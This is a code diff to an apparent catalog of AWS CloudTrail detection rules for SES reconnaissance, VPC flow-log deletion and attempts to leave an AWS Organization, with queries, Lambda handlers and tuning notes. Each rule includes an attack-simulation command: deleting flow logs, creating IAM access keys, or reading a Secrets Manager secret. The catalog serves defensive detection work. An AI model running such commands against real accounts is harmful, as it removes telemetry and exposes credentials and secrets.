+        whyItMatters: "The strongest signal is the ordered shift from discovery into write or credential-affecting activity, not either stage alone.",
+        riskAndImpact: "If missed, defenders may not recognize that benign-looking SES reads were the precursor to active abuse or account compromise.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for SES", "AWS CloudTrail management events for IAM and related services"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "sourceIPAddress"],
+        loggingRequirements: ["SES reads and follow-on SES or IAM writes must be ingested into the same analytics environment.", "Actor identity should be normalized across IAM users and assumed roles.", "The detection engine must support ordered short-window correlation."],
+        limitations: ["Some legitimate SES administration may enumerate before making expected changes.", "Actor-only joins can still be noisy without workflow context.", "The model needs tuning if SES automation regularly performs read-then-write sequences."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor performing SES reconnaissance and follow-on action" },
+          { rawPath: "eventName", normalizedPath: "event.action", notes: "SES or credential action at each stage" },
+          { rawPath: "eventSource", normalizedPath: "event.source", notes: "Service generating the action" },
+          { rawPath: "sourceIPAddress", normalizedPath: "source.ip", notes: "Source IP of the actor" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["discovery"], type: ["info"], action: "ListIdentities", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/attacker", type: "IAMUser" },
+          related: { event: { action: "PutIdentityPolicy" } },
+          source: { ip: "203.0.113.10" },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Stable Actor Identity", description: "Normalize actor identity across direct and assumed-role sessions so SES reads and later abuse actions can be linked reliably.", examples: ["IAM user", "assumed app role"], falsePositiveReduction: "Improves correlation fidelity." },
+        { dimension: "Action Class", description: "Classify the follow-on activity as SES policy abuse, notification manipulation, identity verification abuse, or credential-related action.", examples: ["PutIdentityPolicy", "CreateAccessKey"], falsePositiveReduction: "Makes the recon-to-action path easier to triage." },
+        { dimension: "SES Governance Context", description: "Understand whether the actor and account normally perform SES administration.", examples: ["email operations account", "non-SES workload account"], falsePositiveReduction: "Raises confidence when the sequence appears in an unusual SES context." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model a SES recon-to-action chain: an actor enumerates SES identities, then performs SES write activity or a credential-related action soon afterward. It should require event order and stable actor identity to avoid loose same-user aggregation.",
+        conditions: ["first eventSource equals ses.amazonaws.com and eventName equals ListIdentities or GetIdentityVerificationAttributes", "second event is SES write activity or CreateAccessKey by the same normalized actor identity", "follow-on action occurs within 30 minutes"],
+        tuningGuidance: "1. Require order. 2. Normalize actor identity across sessions. 3. Escalate further when the actor is unauthorized for SES or when SES is rarely used in the account.",
+        whenToFire: "Fire when SES reconnaissance is followed quickly by SES write activity or credential abuse from the same operator identity.",
+      },
+      simulationCommand: "aws ses list-identities --identity-type EmailAddress && aws iam create-access-key --user-name demo-user",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with workflow context and stable identity mapping",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM correlation engines", "Athena with ordered event windows", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because recon-to-action windows are short and actionable.",
+        considerations: ["This is the highest-fidelity SES abuse detector in the set.", "Ordered correlation and stable actor identity are the key dependencies."],
+      },
+    },
   },
 
   // --- VPC Flow Logs Removal ---
@@ -13116,8 +14541,8 @@ def lambda_handler(event, context):
   },
   {
     id: "det-111",
-    title: "Flow Logs Deletion by Unexpected Actor",
-    description: "Detects deletion performed by identities that should not manage network logging. Suspicious: IAM users outside network/platform admin, application roles, workload roles, unusual assumed roles.",
+    title: "Flow Logs Deletion Outside Authorized Network Logging Path",
+    description: "Detects `DeleteFlowLogs` by identities outside approved network, platform, or infrastructure logging workflows. This should rely on explicit actor authorization and automation provenance rather than role-name substring allowlists.",
     awsService: "EC2",
     relatedServices: [],
     severity: "Critical",
@@ -13133,47 +14558,108 @@ detection:
   selection:
     eventSource: ec2.amazonaws.com
     eventName: DeleteFlowLogs
-  filter_arn:
-    userIdentity.arn|contains:
-      - '/role/Network'
-      - '/role/Platform'
-      - '/role/Admin'
-      - '/role/Infra'
-  filter_automation:
-    userIdentity.principalId|contains:
-      - 'terraform'
-      - 'cloudformation'
-  condition: selection and not (filter_arn or filter_automation)
+  condition: selection
 level: critical`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com eventName=DeleteFlowLogs
-| where NOT (like(userIdentity.arn, "%/role/Network%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Infra%") OR like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%"))
-| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.flowLogIds, sourceIPAddress`,
-      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.flowLogIds, sourceIPAddress
+| table _time, userIdentity.type, userIdentity.arn, userIdentity.principalId, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.flowLogIds, sourceIPAddress`,
+      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.principalId, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.flowLogIds, sourceIPAddress
 FROM cloudtrail_logs
 WHERE eventSource = 'ec2.amazonaws.com'
   AND eventName = 'DeleteFlowLogs'
-  AND userIdentity.arn NOT LIKE '%/role/Network%'
-  AND userIdentity.arn NOT LIKE '%/role/Platform%'
-  AND userIdentity.arn NOT LIKE '%/role/Admin%'
-  AND userIdentity.arn NOT LIKE '%/role/Infra%'
-  AND (userIdentity.principalId IS NULL OR (userIdentity.principalId NOT LIKE '%terraform%' AND userIdentity.principalId NOT LIKE '%cloudformation%'))
 ORDER BY eventTime DESC`,
-      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.flowLogIds
+      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.principalId, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.flowLogIds
 | filter eventSource = "ec2.amazonaws.com"
 | filter eventName = "DeleteFlowLogs"
-| filter userIdentity.arn not like /\\/role\\/(Network|Platform|Admin|Infra)/ and userIdentity.principalId not like /terraform|cloudformation/
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["DeleteFlowLogs"] } }, null, 2),
+      lambda: `"""
+Flow Logs Deletion Outside Authorized Network Logging Path
+Trigger: EventBridge rule matching DeleteFlowLogs.
+Use for: Real-time authorization checks on network telemetry deletion.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "ec2.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "DeleteFlowLogs":
+        return {"matched": False}
+
+    return {
+        "matched": "requires-authorized-flow-log-manager-check",
+        "alert": {
+            "rule_id": "det-111",
+            "title": "Flow Logs Deletion Outside Authorized Network Logging Path",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "flow_log_ids": detail.get("requestParameters", {}).get("flowLogIds"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.flowLogIds", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "DeleteFlowLogs", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { flowLogIds: ["fl-0abc123"] }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for flow log management.", "Update allowlist if legitimate."],
-    testingSteps: ["As a non-network role, call DeleteFlowLogs.", "Verify detection triggers."],
+    investigationSteps: ["Identify the actor, session issuer, and any automation provenance behind the deletion request.", "Verify whether this identity is explicitly approved to manage VPC flow logs for the affected environment or account.", "Determine whether the request came from a trusted infrastructure workflow or from an unexpected principal."],
+    testingSteps: ["As an identity outside the approved network-logging manager set, call `DeleteFlowLogs` against a test flow log.", "Verify CloudTrail captures the actor and flow log context.", "Run the detector and confirm it relies on explicit actor authorization rather than role-name or Terraform substring heuristics."],
+    lifecycle: {
+      whyItMatters: "Only a narrow set of identities should remove network telemetry. When an unapproved actor deletes flow logs, the event is a strong defense-evasion signal.",
+      threatContext: {
+        attackerBehavior: "An attacker may use a compromised app role, developer identity, or unexpected assumed role to delete flow logs and reduce network visibility.",
+        realWorldUsage: "This is practical because the delete operation is native AWS control-plane activity and may look like infrastructure administration without strong authorization context.",
+        whyItMatters: "Authorization context matters more than whether the actor's ARN contains Network or Platform-like text.",
+        riskAndImpact: "If missed, unauthorized principals can blind defenders to later exfiltration, command-and-control, or lateral movement activity.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for EC2", "Authorized network-logging manager inventory", "Infrastructure automation provenance"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.type", "userIdentity.arn", "userIdentity.principalId", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.flowLogIds", "sourceIPAddress"],
+        loggingRequirements: ["DeleteFlowLogs events must be ingested with full actor context.", "The environment should maintain exact principals allowed to manage flow logs.", "Automation provenance such as Terraform or CloudFormation should be modeled explicitly rather than inferred from substrings."],
+        limitations: ["Without actor inventories the rule becomes weak anomaly detection.", "Legitimate break-glass or manual infra changes may still need workflow context.", "Flow log IDs require enrichment to fully understand impact."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor deleting the flow logs" },
+          { rawPath: "userIdentity.sessionContext.sessionIssuer.arn", normalizedPath: "aws.identity.session_issuer.arn", notes: "Underlying role where relevant" },
+          { rawPath: "requestParameters.flowLogIds", normalizedPath: "aws.ec2.flow_log.ids", notes: "Deleted flow log identifiers" },
+          { rawPath: "userIdentity.principalId", normalizedPath: "user.id", notes: "Stable actor identifier where available" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["change"], action: "DeleteFlowLogs", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session", type: "AssumedRole", id: "AROAXXXXX:session" },
+          aws: { ec2: { flow_log: { ids: ["fl-0abc123"] } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Authorized Flow Log Managers", description: "Exact inventory of identities allowed to create or delete VPC flow logs.", examples: ["network admin role", "approved infra pipeline"], falsePositiveReduction: "Replaces brittle role-name and principalId allowlists." },
+        { dimension: "Workflow Provenance", description: "Determine whether the deletion came from trusted IaC, approved maintenance, or manual ad hoc access.", examples: ["planned Terraform apply", "manual unknown session"], falsePositiveReduction: "Separates expected automation from suspicious manual telemetry removal." },
+        { dimension: "Environment Scope", description: "Model which VPCs or accounts each authorized actor may manage.", examples: ["dev network only", "prod network team"], falsePositiveReduction: "Prevents broad admin allowlists from masking out-of-scope deletions." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect flow-log deletion outside approved network-logging workflows. It should match `DeleteFlowLogs`, resolve the actor and workflow provenance, and then check whether that identity is explicitly allowed to manage flow logs for the affected environment.",
+        conditions: ["eventSource equals ec2.amazonaws.com", "eventName equals DeleteFlowLogs", "actor is not in the approved flow-log-manager inventory or actor is outside approved environment scope or request lacks approved workflow provenance"],
+        tuningGuidance: "1. Use exact actor inventories. 2. Model actor-to-environment scope. 3. Treat IaC and emergency infrastructure workflows as explicit approved paths with auditability.",
+        whenToFire: "Fire when flow logs are deleted by an identity outside approved network logging workflows.",
+      },
+      simulationCommand: "aws ec2 delete-flow-logs --flow-log-ids fl-0abc123 --profile dev-user",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with actor inventories and workflow provenance; high with role-name heuristics",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with actor inventories", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because telemetry deletion is immediately actionable.",
+        considerations: ["This is the actor-centric companion to the baseline flow-log deletion rule.", "Actor inventory and workflow provenance are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-112",
     title: "Deletion of Sensitive Flow Logs",
-    description: "Detects deletion of flow logs tied to sensitive VPCs, subnets, or ENIs. Critical targets: prod VPCs, egress VPCs, security tooling VPCs, domain/directory subnets. Requires flow log ID to VPC/subnet enrichment where available.",
+    description: "Detects deletion of flow logs attached to sensitive VPCs, subnets, or network interfaces. This should depend on resolved asset classification and guardrail importance, not resource-name keyword heuristics.",
     awsService: "EC2",
     relatedServices: [],
     severity: "Critical",
@@ -13206,16 +14692,94 @@ ORDER BY eventTime DESC
 | filter eventName = "DeleteFlowLogs"
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["DeleteFlowLogs"] } }, null, 2),
+      lambda: `"""
+Deletion of Sensitive Flow Logs
+Trigger: EventBridge rule matching DeleteFlowLogs.
+Use for: Real-time sensitive-target classification on network telemetry removal.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "ec2.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "DeleteFlowLogs":
+        return {"matched": False}
+
+    return {
+        "matched": "requires-sensitive-flow-log-target-check",
+        "alert": {
+            "rule_id": "det-112",
+            "title": "Deletion of Sensitive Flow Logs",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "flow_log_ids": detail.get("requestParameters", {}).get("flowLogIds"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.flowLogIds", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "DeleteFlowLogs", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { flowLogIds: ["fl-prod-vpc-0abc123"] }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify deleted flow log IDs.", "Enrich with VPC/subnet context (prod, egress, security).", "Verify if deletion was authorized."],
-    testingSteps: ["Delete flow logs for a prod VPC.", "Verify detection triggers with enrichment."],
+    investigationSteps: ["Resolve each deleted flow log to its VPC, subnet, ENI, and network role.", "Verify whether the deleted telemetry covered sensitive environments such as production, egress, identity, or security tooling segments.", "Determine whether the actor was approved to remove telemetry from those sensitive network scopes."],
+    testingSteps: ["Delete a test flow log that is mapped to a sensitive VPC or egress segment in inventory.", "Verify CloudTrail captures the flow log IDs.", "Run the detector and confirm it keys on sensitive network classification rather than flow-log naming patterns."],
+    lifecycle: {
+      whyItMatters: "Deleting flow logs from sensitive network areas is much more dangerous than removing ordinary telemetry. These targets often cover crown-jewel traffic, egress paths, or identity infrastructure.",
+      threatContext: {
+        attackerBehavior: "An attacker may selectively remove flow logs from high-value VPCs, subnets, or interfaces before network-based exfiltration or lateral movement.",
+        realWorldUsage: "This approach is attractive because it reduces visibility precisely where defenders most need it.",
+        whyItMatters: "The signal comes from the sensitivity of the covered network segment, not from string patterns embedded in identifiers.",
+        riskAndImpact: "If missed, defenders may lose telemetry over the most important network paths in the environment just before follow-on abuse.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for EC2", "Flow-log-to-resource inventory", "VPC, subnet, and ENI sensitivity classification"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.flowLogIds", "sourceIPAddress"],
+        loggingRequirements: ["DeleteFlowLogs events must be ingested.", "The environment should resolve flow-log IDs to the resources they cover.", "Sensitive network classifications such as prod, egress, or security segments should be maintained in inventory."],
+        limitations: ["FlowLogIds alone are not sufficient without enrichment.", "Some legitimate telemetry migrations may target sensitive environments and require workflow context.", "The same API covers both low-value and high-value telemetry removal until enrichment is applied."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.flowLogIds", normalizedPath: "aws.ec2.flow_log.ids", notes: "Deleted flow log identifiers" },
+          { rawPath: "enrichment.resourceType", normalizedPath: "aws.ec2.flow_log.resource_type", notes: "Resolved target type such as VPC, subnet, or ENI" },
+          { rawPath: "enrichment.resourceSensitivity", normalizedPath: "aws.ec2.flow_log.resource_sensitivity", notes: "Resolved sensitivity of the covered network segment" },
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor deleting the flow logs" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["change"], action: "DeleteFlowLogs", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          aws: { ec2: { flow_log: { ids: ["fl-0abc123"], resource_type: "vpc", resource_sensitivity: "production_egress" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Target Network Sensitivity", description: "Resolve whether the deleted flow logs covered production, egress, identity, or security tooling segments.", examples: ["prod egress VPC", "security monitoring subnet"], falsePositiveReduction: "Raises confidence only when telemetry loss affects important network scopes." },
+        { dimension: "Coverage Importance", description: "Determine what detections or controls relied on the removed flow logs.", examples: ["egress monitoring", "east-west traffic visibility"], falsePositiveReduction: "Improves prioritization of the impact of telemetry loss." },
+        { dimension: "Actor-to-Target Scope", description: "Check whether the actor is allowed to manage flow logs for those sensitive resources.", examples: ["prod network team only", "developer outside prod scope"], falsePositiveReduction: "Combines target sensitivity with authorization scope." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect flow-log deletion against sensitive network telemetry targets. It should match `DeleteFlowLogs`, resolve the covered resources from inventory, classify their sensitivity, and then alert when the removed telemetry protected high-value network segments.",
+        conditions: ["eventSource equals ec2.amazonaws.com", "eventName equals DeleteFlowLogs", "one or more deleted flow logs map to sensitive VPCs, subnets, or ENIs"],
+        tuningGuidance: "1. Build reliable flow-log-to-resource mappings. 2. Classify sensitive network segments explicitly. 3. Escalate further when the actor is not approved for those targets or when suspicious activity follows soon after.",
+        whenToFire: "Fire when deleted flow logs protect sensitive network infrastructure or telemetry coverage areas.",
+      },
+      simulationCommand: "aws ec2 delete-flow-logs --flow-log-ids fl-0abc123",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with target enrichment and workflow context",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with flow-log inventory joins", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because sensitive telemetry removal is immediately actionable.",
+        considerations: ["This is the target-centric flow-log deletion detector.", "Flow-log inventory and sensitivity classification are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-113",
     title: "Flow Logs Removal Followed by Suspicious Network or Exfiltration Behavior",
-    description: "High-confidence defense-evasion: DeleteFlowLogs then shortly afterward same actor performs internet gateway changes, route table changes, security group changes, NACL changes, snapshot sharing, secrets access, or data-exfiltration-adjacent actions.",
+    description: "High-confidence defense-evasion chain that correlates flow-log deletion with later network-control, data-access, or exfiltration-adjacent activity. This should require ordered sequence and stable actor or account linkage, not loose co-occurrence.",
     awsService: "EC2",
     relatedServices: ["Secrets Manager", "S3", "KMS"],
     severity: "Critical",
@@ -13241,9 +14805,9 @@ detection:
       - ModifySnapshotAttribute
       - GetSecretValue
       - Decrypt
-  condition: 1 of selection_*
+  condition: selection_delete
 level: critical
-# Full correlation (actor, 30 min) requires SIEM.`,
+# Full correlation requires ordered sequence and stable actor or account linkage across telemetry removal and follow-on activity.`,
       splunk: `index=aws sourcetype=aws:cloudtrail
   ((eventSource=ec2.amazonaws.com AND eventName=DeleteFlowLogs) OR (eventName=AttachInternetGateway OR eventName=CreateRoute OR eventName=AuthorizeSecurityGroupIngress OR eventName=AuthorizeSecurityGroupEgress OR eventName=CreateNetworkAclEntry OR eventName=ModifySnapshotAttribute OR eventName=GetSecretValue OR eventName=Decrypt))
 | eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
@@ -13276,18 +14840,97 @@ ORDER BY d.delete_time DESC`,
 | filter cnt > 1
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["DeleteFlowLogs"] } }, null, 2),
+      lambda: `"""
+Flow Logs Removal Followed by Suspicious Network or Exfiltration Behavior
+Trigger: EventBridge rule matching DeleteFlowLogs.
+Use for: Correlation from telemetry removal to later suspicious cloud activity.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "ec2.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "DeleteFlowLogs":
+        return {"matched": False}
+
+    return {
+        "matched": "requires-flow-log-deletion-plus-follow-on-activity-correlation",
+        "alert": {
+            "rule_id": "det-113",
+            "title": "Flow Logs Removal Followed by Suspicious Network or Exfiltration Behavior",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "flow_log_ids": detail.get("requestParameters", {}).get("flowLogIds"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.flowLogIds", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "DeleteFlowLogs", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { flowLogIds: ["fl-0abc123"] }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify DeleteFlowLogs and follow-on activity sequence.", "Verify if follow-on changes indicate exfiltration or stealth.", "Check for snapshot sharing or secrets access."],
-    testingSteps: ["Delete flow logs, then perform ModifySnapshotAttribute or GetSecretValue within 30 min.", "Run Splunk or Athena correlation query."],
+    investigationSteps: ["Identify the exact flow-log deletion event and the ordered follow-on activity that occurred within 30 minutes.", "Determine whether the same normalized actor or account performed later network-control changes, secrets access, or exfiltration-adjacent actions.", "Assess whether the deletion was used to reduce visibility immediately before suspicious behavior."],
+    testingSteps: ["Delete a test flow log and then perform `ModifySnapshotAttribute`, `GetSecretValue`, or a modeled network-control change within 30 minutes.", "Verify both the deletion and follow-on events appear in CloudTrail.", "Run the detector and confirm it requires ordered correlation rather than simple same-actor event grouping."],
+    lifecycle: {
+      whyItMatters: "Telemetry removal becomes much more suspicious when it is followed by network-control changes or data-access activity. This sequence strongly suggests flow logs were deleted to reduce visibility before later abuse.",
+      threatContext: {
+        attackerBehavior: "An attacker may delete flow logs and then rapidly modify network paths, expose data, retrieve secrets, or perform exfiltration-adjacent actions.",
+        realWorldUsage: "This is attractive because it lowers the chance that subsequent network or data-theft behavior is observed by defenders.",
+        whyItMatters: "The strongest signal is the ordered chain from defense evasion into follow-on abuse, not any single action alone.",
+        riskAndImpact: "If missed, defenders may not recognize that suspicious network or data activity was preceded by deliberate telemetry reduction.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for EC2", "AWS CloudTrail management events for Secrets Manager, KMS, and related services"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.flowLogIds", "sourceIPAddress"],
+        loggingRequirements: ["DeleteFlowLogs and follow-on suspicious events must be ingested into the same analytics environment.", "Actor or account identity should be normalized across sessions where possible.", "The engine must support ordered short-window correlation."],
+        limitations: ["Actor-only joins can be noisy without target and workflow context.", "Some legitimate maintenance may involve telemetry changes followed by additional infra work.", "The model should be tuned to local network and secrets workflows."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor deleting flow logs or performing follow-on actions" },
+          { rawPath: "requestParameters.flowLogIds", normalizedPath: "aws.ec2.flow_log.ids", notes: "Flow logs removed during the first stage" },
+          { rawPath: "follow_on.eventName", normalizedPath: "related.event.action", notes: "Suspicious action after telemetry removal" },
+          { rawPath: "userIdentity.accountId", normalizedPath: "cloud.account.id", notes: "Account context for correlation where actor identity changes" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["change"], action: "DeleteFlowLogs", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          aws: { ec2: { flow_log: { ids: ["fl-0abc123"] } } },
+          related: { event: { action: "ModifySnapshotAttribute" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Stable Actor or Account Linkage", description: "Normalize actor and account context so telemetry removal can be correlated to later suspicious activity reliably.", examples: ["same IAM user", "same account with session changes"], falsePositiveReduction: "Improves fidelity of the ordered chain." },
+        { dimension: "Follow-On Activity Class", description: "Classify the later action as network exposure, secrets access, snapshot abuse, or related exfiltration behavior.", examples: ["CreateRoute", "GetSecretValue", "ModifySnapshotAttribute"], falsePositiveReduction: "Makes the post-deletion abuse path easier to triage." },
+        { dimension: "Target Telemetry Importance", description: "Resolve how important the deleted flow logs were to visibility over the affected environment.", examples: ["prod egress telemetry", "noncritical dev telemetry"], falsePositiveReduction: "Raises urgency when important telemetry was removed before abuse." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model a defense-evasion-to-action sequence: flow logs are deleted and then suspicious network, secrets, or exfiltration-adjacent behavior occurs soon afterward. It should require event order and stable actor or account linkage.",
+        conditions: ["first eventSource equals ec2.amazonaws.com and eventName equals DeleteFlowLogs", "second event is a modeled suspicious action by the same normalized actor or linked account context", "follow-on activity occurs within 30 minutes"],
+        tuningGuidance: "1. Require order. 2. Normalize actor or account identity for correlation. 3. Escalate further when the deleted flow logs covered sensitive network segments or the actor was unauthorized to remove them.",
+        whenToFire: "Fire when flow-log deletion is followed quickly by suspicious network-control or exfiltration-adjacent activity.",
+      },
+      simulationCommand: "aws ec2 delete-flow-logs --flow-log-ids fl-0abc123 && aws secretsmanager get-secret-value --secret-id ExampleSecret",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with ordered correlation and local workflow context",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM correlation engines", "Athena with ordered event windows", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because the evasion-to-action window is short.",
+        considerations: ["This is the highest-fidelity flow-log deletion detector in the family.", "Ordered correlation and actor/account linkage are the main dependencies."],
+      },
+    },
   },
 
   // --- AWS Organizations Leave ---
   {
     id: "det-114",
     title: "Member Account Attempted to Leave Organization",
-    description: "Baseline visibility for any LeaveOrganization attempt. This is inherently dangerous because it can remove the account from SCPs and organization policy coverage. Even the attempt matters.",
+    description: "Baseline visibility for any `LeaveOrganization` attempt. Even blocked or failed attempts matter because this action can sever the account from SCPs and centralized guardrail coverage.",
     awsService: "Organizations",
     relatedServices: [],
     severity: "Critical",
@@ -13317,16 +14960,96 @@ ORDER BY eventTime DESC`,
 | filter eventName = "LeaveOrganization"
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.organizations"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["organizations.amazonaws.com"], eventName: ["LeaveOrganization"] } }, null, 2),
+      lambda: `"""
+Member Account Attempted to Leave Organization
+Trigger: EventBridge rule matching LeaveOrganization.
+Use for: Baseline visibility into organization-escape attempts.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "organizations.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "LeaveOrganization":
+        return {"matched": False}
+
+    user_identity = detail.get("userIdentity", {})
+    return {
+        "matched": True,
+        "alert": {
+            "rule_id": "det-114",
+            "title": "Member Account Attempted to Leave Organization",
+            "severity": "Critical",
+            "actor": user_identity.get("arn") or user_identity.get("accountId"),
+            "account_id": detail.get("recipientAccountId"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
